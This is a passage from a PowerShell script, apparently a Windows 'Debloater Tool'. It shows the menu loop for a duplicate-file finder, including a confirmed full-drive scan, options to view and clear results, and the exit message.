                                $duplicates = Find-DuplicateFiles -Path $folder
                                $allDuplicates += $duplicates
                            }
                        }
                        Show-DuplicateResults -Duplicates $allDuplicates
                    }

                    '3' {
                        # Scan entire system
                        Write-Host "WARNING: Full system scan may take 30+ minutes!" -ForegroundColor Red
                        $confirm = Read-Host "Continue with full system scan? (y/n)"
                        if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                            Write-Host "Starting full system scan..." -ForegroundColor Yellow
                            $duplicates = Find-DuplicateFiles -Path "C:\" -Recursive
                            Show-DuplicateResults -Duplicates $duplicates
                        }
                    }

                    '4' {
                        # View duplicate groups
                        if ($script:LastDuplicateResults -and $script:LastDuplicateResults.Count -gt 0) {
                            Show-DuplicateGroups -Duplicates $script:LastDuplicateResults
                        } else {
                            Write-Host "No duplicate results found. Please run a scan first." -ForegroundColor Yellow
                        }
                    }

                    '5' {
                        # Clear results
                        $script:LastDuplicateResults = @()
                        Write-Host "SUCCESS: Duplicate results cleared." -ForegroundColor Green
                    }

                    '0' { break }
                    default { Write-Host "Invalid choice." -ForegroundColor Red }
                }

                if ($duplicateChoice -ne '0') {
                    Pause-For-User
                }

            } while ($duplicateChoice -ne '0')
        }
        #endregion
    }
} while ($choice -ne '2')
#endregion

#region APPLICATION EXIT
# ============================================================================
# APPLICATION EXIT & CLEANUP
# ============================================================================

Write-Host "`nThanks for using Debloater Tool! Stay comfy! :)" -ForegroundColor Cyan
Pause-For-User "Press Enter to exit..."
#endregion
